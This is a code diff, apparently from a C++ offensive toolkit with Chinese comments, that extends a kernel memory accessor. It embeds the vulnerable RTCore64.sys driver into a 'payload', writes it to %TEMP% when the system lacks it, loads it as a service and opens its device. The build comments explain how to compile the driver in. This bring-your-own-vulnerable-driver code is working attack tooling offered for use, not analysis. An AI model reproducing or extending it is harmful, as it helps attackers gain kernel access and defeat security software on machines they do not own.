@@ -18,8 +18,17 @@
 #include <cstdio>
 #include <cstring>
 #include <algorithm>
+#include <fstream>
 #ifdef _MSC_VER
 #include <intrin.h>     // __readcr3() for MSVC
+#endif
+
+// BYOVD 驱动嵌入支持: 将 RTCore64.sys 编译进 payload
+//   1. python scripts/embed_driver.py RTCore64.sys
+//   2. 复制生成的 rtcore64_embed.h 到 stealth_lib/
+//   3. 编译时加 -DBYOVD_EMBED_RTCORE64
+#ifdef BYOVD_EMBED_RTCORE64
+#include "rtcore64_embed.h"
 #endif
 
 #pragma comment(lib, "advapi32.lib")
@@ -174,6 +183,59 @@ bool KernelMemoryAccessor::IsHVCIEnabled() {
     }
 
     return false;
+}
+
+// ============================================================
+// 确保 BYOVD 驱动文件存在 (嵌入式提取回退)
+//
+// 优先级:
+//   1. System32\drivers\<name> (系统已安装)
+//   2. %TEMP%\<name> (从嵌入字节提取)
+// ============================================================
+static std::wstring EnsureDriverFile(const std::wstring& driverName) {
+    wchar_t sysPath[MAX_PATH];
+
+    // 1. 检查 System32\drivers
+    GetSystemDirectoryW(sysPath, MAX_PATH);
+    wcscat_s(sysPath, L"\\drivers\\");
+    wcscat_s(sysPath, driverName.c_str());
+
+    if (GetFileAttributesW(sysPath) != INVALID_FILE_ATTRIBUTES) {
+        return std::wstring(sysPath); // 系统已安装
+    }
+
+    // 2. 从嵌入字节提取到 %TEMP%
+#ifdef BYOVD_EMBED_RTCORE64
+    const uint8_t* embedData = nullptr;
+    size_t embedSize = 0;
+
+    // 匹配驱动文件名
+    if (driverName == L"RTCore64.sys") {
+        embedData = stealth::embedded::RTCore64_data;
+        embedSize = stealth::embedded::RTCore64_size;
+    }
+    // 可扩展: gdrv.sys 等
+
+    if (embedData && embedSize > 0) {
+        wchar_t tempPath[MAX_PATH];
+        GetTempPathW(MAX_PATH, tempPath);
+        wcscat_s(tempPath, driverName.c_str());
+
+        // 写入嵌入字节到临时文件
+        std::ofstream out(tempPath, std::ios::binary);
+        if (out.is_open()) {
+            out.write(reinterpret_cast<const char*>(embedData), embedSize);
+            out.close();
+
+            if (GetFileAttributesW(tempPath) != INVALID_FILE_ATTRIBUTES) {
+                return std::wstring(tempPath);
+            }
+        }
+    }
+#endif
+
+    // 3. 回退: 返回空 → 尝试以纯文件名加载 (LoadDriver 会补全 System32 路径)
+    return L"";
 }
 
 bool KernelMemoryAccessor::LoadDriver(const std::wstring& serviceName, 
@@ -540,12 +602,16 @@ bool KernelMemoryAccessor::Initialize(const BYOVDDriverInfo& driver) {
         // 不中止, 但标记不可用
     }
 
-    // 2. 加载驱动
-    if (!LoadDriver(driver.serviceName, driver.driverPath)) {
+    // 2. 确保驱动文件存在 (System32\drivers → 嵌入提取到 %TEMP%)
+    std::wstring resolvedPath = EnsureDriverFile(driver.driverPath);
+    const std::wstring& actualPath = resolvedPath.empty() ? driver.driverPath : resolvedPath;
+
+    // 3. 加载驱动
+    if (!LoadDriver(driver.serviceName, actualPath)) {
         return false;
     }
 
-    // 3. 打开设备
+    // 4. 打开设备
     m_hDevice = CreateFileW(driver.devicePath.c_str(),
         GENERIC_READ | GENERIC_WRITE,
         FILE_SHARE_READ | FILE_SHARE_WRITE,
@@ -568,11 +634,14 @@ void KernelMemoryAccessor::Shutdown() {
     m_pageTableWalker.reset();
     g_physMappings.clear();
 
+    // v3.24: 先卸载驱动再关闭句柄, 避免 CloseHandle 期间 IOCTL 竞态
+    if (!m_driverInfo.serviceName.empty()) {
+        UnloadDriver(m_driverInfo.serviceName);
+    }
     if (m_hDevice != INVALID_HANDLE_VALUE) {
         CloseHandle(m_hDevice);
         m_hDevice = INVALID_HANDLE_VALUE;
     }
-    UnloadDriver(m_driverInfo.serviceName);
 }
 
 void KernelMemoryAccessor::EjectLoadedDrivers() {
